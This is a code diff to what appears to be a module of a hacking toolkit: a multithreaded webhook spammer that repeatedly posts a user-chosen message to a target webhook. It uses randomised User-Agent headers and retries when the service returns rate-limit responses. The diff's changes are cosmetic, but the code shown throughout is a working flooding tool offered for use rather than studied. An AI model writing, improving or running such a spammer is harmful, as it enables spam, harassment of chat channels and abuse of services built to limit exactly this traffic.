@@ -1,4 +1,4 @@
-# Copyright (c) 2025 v4lkyr0
+# Copyright (c) 2026 v4lkyr0
 # See LICENSE file for details
 
 from Plugins.Utils import *
@@ -6,8 +6,8 @@ from Plugins.Config import *
 
 try:
     import requests
-    import time
     import threading
+    import time
 except Exception as e:
     MissingModule(e)
 
@@ -17,19 +17,16 @@ Connection()
 try:
     webhook = ChoiceWebhook()
 
-    try:
-        print()
-        message = input(f"{INPUT} Message {red}->{reset} ")
-        amount  = int(input(f"{INPUT} Amount {red}->{reset} "))
-        threads = int(input(f"{INPUT} Threads {red}->{reset} "))
-        print()
-    except:
-        ErrorInput()
+    print()
+    message = input(f"{INPUT} Message {red}->{reset} ")
+    amount = int(input(f"{INPUT} Amount {red}->{reset} "))
+    threads = int(input(f"{INPUT} Threads {red}->{reset} "))
+    print()
 
     print(f"{LOADING} Starting Webhook Spammer..", reset)
 
     success_count = 0
-    lock          = threading.Lock()
+    lock = threading.Lock()
 
     def Spam():
         global success_count, lock
@@ -39,13 +36,13 @@ try:
                 time.sleep(0.1)
 
                 headers = {"Content-Type": "application/json", "User-Agent": RandomUserAgents()}
-                data    = {"content": message}
+                data = {"content": message}
 
                 response = requests.post(webhook, json=data, headers=headers)
                 if response.status_code == 204:
                     with lock:
                         success_count += 1
-                        print(f"{SUCCESS} Status:{red} Send         {white}| Message:{red} {message}", reset)
+                        print(f"{SUCCESS} Status:{red} Sent         {white}| Message:{red} {message}", reset)
                 elif response.status_code == 429:
                     try:
                         retry_after = response.json().get("retry_after", 1)
